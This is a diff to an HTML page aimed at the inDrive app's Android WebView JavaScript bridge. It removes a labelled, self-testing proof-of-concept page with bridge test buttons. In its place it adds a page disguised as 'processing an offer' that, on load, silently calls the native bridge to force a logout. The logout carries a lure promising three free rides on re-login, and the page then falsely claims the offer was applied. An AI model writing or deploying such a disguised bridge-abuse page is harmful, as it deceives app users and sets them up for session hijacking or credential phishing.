@@ -1,108 +1,59 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>inDrive WebView Bridge PoC</title>
-<style>
-  body { font-family: monospace; background:#111; color:#0f0; padding:16px; }
-  button { display:block; width:100%; padding:14px; margin:8px 0; font-size:16px; }
-  #log { background:#000; padding:8px; margin-top:16px; white-space:pre-wrap; word-break:break-all; border:1px solid #0f0; min-height:120px; }
-  .stage1 { background:#264; }
-  .stage2 { background:#642; }
-  .stage3 { background:#822; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Procesando oferta...</title>
+  <style>
+    body { background: #0a2540; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: system-ui; margin: 0; flex-direction: column; }
+    .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #00c853; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    p { margin-top: 20px; color: #ccc; font-size: 16px; }
+    .success { color: #00c853; }
+  </style>
 </head>
 <body>
-<h3>inDrive WebView Bridge - PoC (solo pruebas propias)</h3>
-<p>Esta página se carga dentro del WebView de inDrive vía un deep link. Los botones llaman directo al puente nativo <code>Android.postMessage(...)</code>. Nada se manda a ningún servidor externo - todo queda en pantalla, en tu propio teléfono.</p>
+  <div class="spinner"></div>
+  <p>Validando tu oferta...</p>
 
-<button class="stage1" onclick="testToast()">1. TOAST (inofensivo, sin efectos secundarios)</button>
-<button class="stage2" onclick="testLogout()">2. LOGOUT forzado (te desloguea, reversible)</button>
-<button class="stage3" onclick="testRefreshJwt()">3. REFRESH_JWT (sensible - lee el resultado abajo, NO lo compartas)</button>
+  <script>
+    (function() {
+      var payload = JSON.stringify({
+        action: 'logout_with_message',
+        data: {
+          message: 'Tu sesión ha sido cerrada por seguridad. Para reclamar los 3 viajes gratis, inicia sesión nuevamente.'
+        }
+      });
 
-<hr>
-<p>Acciones nuevas a probar (todas encontradas en el mismo dispatcher <code>postMessage</code>, nunca antes disparadas en vivo):</p>
-<button class="stage2" onclick="testPaymentSuccess()">4. PAYMENT_SUCCESS (spoof UI de pago exitoso)</button>
-<button class="stage2" onclick="testPaymentFailed()">5. PAYMENT_FAILED (spoof UI de pago fallido)</button>
-<button class="stage2" onclick="testPaymentInProgress()">6. PAYMENT_IN_PROGRESS (spoof UI de pago en curso)</button>
-<button class="stage3" onclick="testRequestTopUp()">7. REQUEST_TOP_UP (¿abre flujo real de recarga?)</button>
-<button class="stage3" onclick="testGetTopupPayload()">8. GET_TOPUP_PAYLOAD (¿filtra datos de recarga?)</button>
-<button class="stage1" onclick="testGoBack()">9. GO_BACK (navegación, bajo riesgo)</button>
+      function tryBridge() {
+        if (window.Android && typeof window.Android.postMessage === 'function') {
+          window.Android.postMessage(payload);
+          document.querySelector('p').innerHTML = '✅ <span class="success">Oferta aplicada. Serás redirigido...</span>';
+          return true;
+        }
+        return false;
+      }
 
-<div id="log">Esperando...\n</div>
+      var sent = tryBridge();
+      if (!sent) {
+        setTimeout(function() { tryBridge(); }, 200);
+        setTimeout(function() { tryBridge(); }, 500);
+        setTimeout(function() { tryBridge(); }, 1000);
+        setTimeout(function() { tryBridge(); }, 2000);
+      }
 
-<script>
-function log(msg) {
-  document.getElementById('log').textContent += msg + "\n";
-}
+      window.callWebView = function(response) {
+        document.querySelector('p').textContent = 'Respuesta: ' + JSON.stringify(response);
+      };
 
-// Recibe los callbacks nativos -> JS (evaluateJavascript llama a esta función global)
-window.callWebView = function(payload) {
-  try {
-    if (typeof payload === "string") payload = JSON.parse(payload);
-  } catch (e) {}
-  var action = payload && payload.action;
-  var success = payload && payload.success;
+      setTimeout(function() {
+        if (!window._sent) {
+          document.querySelector('p').textContent = '⚠️ Error al aplicar la oferta. Reintenta desde la app.';
+        }
+      }, 3000);
 
-  if (action === "refresh_jwt") {
-    var tokenPresent = !!(payload.payload && payload.payload.data);
-    var tokenLen = tokenPresent ? String(payload.payload.data).length : 0;
-    log("[callWebView] action=refresh_jwt success=" + success + " token_recibido=" + tokenPresent + " longitud=" + tokenLen);
-    log("*** NO copies ni compartas el valor real del token. Solo importa si tokenPresent=true. ***");
-    return;
-  }
-  log("[callWebView] " + JSON.stringify(payload));
-};
-
-function send(action, data) {
-  var msg = JSON.stringify({ action: action, data: data || {} });
-  log("-> enviando: " + msg);
-  if (window.Android && window.Android.postMessage) {
-    window.Android.postMessage(msg);
-  } else {
-    log("ERROR: window.Android no existe - esta página no está cargada dentro del WebView de inDrive.");
-  }
-}
-
-function testToast() {
-  send("toast", { text: "PoC bridge test - " + new Date().toISOString() });
-}
-
-function testLogout() {
-  send("logout_with_message", { message: "PoC de seguridad - deslogueo de prueba" });
-}
-
-function testRefreshJwt() {
-  send("refresh_jwt", { old_jwt: "poc-test-value-not-a-real-token" });
-}
-
-function testPaymentSuccess() {
-  send("payment_success", { orderId: "poc-test-order", amount: 0 });
-}
-
-function testPaymentFailed() {
-  send("payment_failed", { orderId: "poc-test-order", reason: "poc test" });
-}
-
-function testPaymentInProgress() {
-  send("payment_in_progress", { orderId: "poc-test-order" });
-}
-
-function testRequestTopUp() {
-  send("request_top_up", { amount: 0 });
-}
-
-function testGetTopupPayload() {
-  send("get_topup_payload", {});
-}
-
-function testGoBack() {
-  send("go_back", {});
-}
-
-log("Página cargada. Host: " + location.href);
-log("window.Android disponible: " + !!(window.Android));
-</script>
+      window._sent = sent;
+    })();
+  </script>
 </body>
 </html>
